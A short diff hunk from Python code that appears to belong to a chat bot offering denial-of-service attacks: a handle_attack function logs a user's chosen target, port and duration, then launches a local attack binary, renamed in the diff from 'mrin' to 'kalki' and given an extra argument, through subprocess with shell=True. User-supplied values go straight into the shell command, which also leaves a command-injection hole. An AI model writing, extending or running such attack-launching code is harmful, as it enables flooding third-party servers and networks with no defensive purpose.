@@ -314,7 +314,7 @@ def handle_attack(message):
                     log_command(user_id, target, port, time_in_seconds)
 
                     # Start the attack
-                    full_command = f"./mrin {target} {port} {time_in_seconds} 1200"
+                    full_command = f"./kalki {target} {port} {time_in_seconds} 1024 1200"
                     subprocess.Popen(full_command, shell=True)
 
                     # Schedule "Attack Ended" message
